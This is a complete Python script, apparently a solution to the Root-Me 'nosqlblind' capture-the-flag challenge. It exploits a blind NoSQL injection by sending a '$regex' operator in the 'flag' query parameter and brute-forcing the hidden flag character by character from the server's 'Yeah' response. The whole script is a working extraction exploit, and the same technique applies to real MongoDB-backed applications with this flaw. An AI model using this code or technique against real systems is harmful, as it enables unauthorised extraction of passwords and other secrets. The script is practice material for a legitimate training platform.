import requests
import re
import sys
 
def getFlag():
    s = requests.Session()
    passwd = ''
    while True:
        for i in range(32, 127 + 1):
            if i == 127:
                return 'Le flag est : ' + passwd
 
            temp = passwd + chr(i)
            sys.stdout.write('Testing... ' + temp + "\r")
            sys.stdout.flush()
            r = s.get('http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=^'+ re.escape(temp) +'.*$')
 
            if re.search('Yeah', r.text) != None:
                passwd = temp
                break
 
print(getFlag())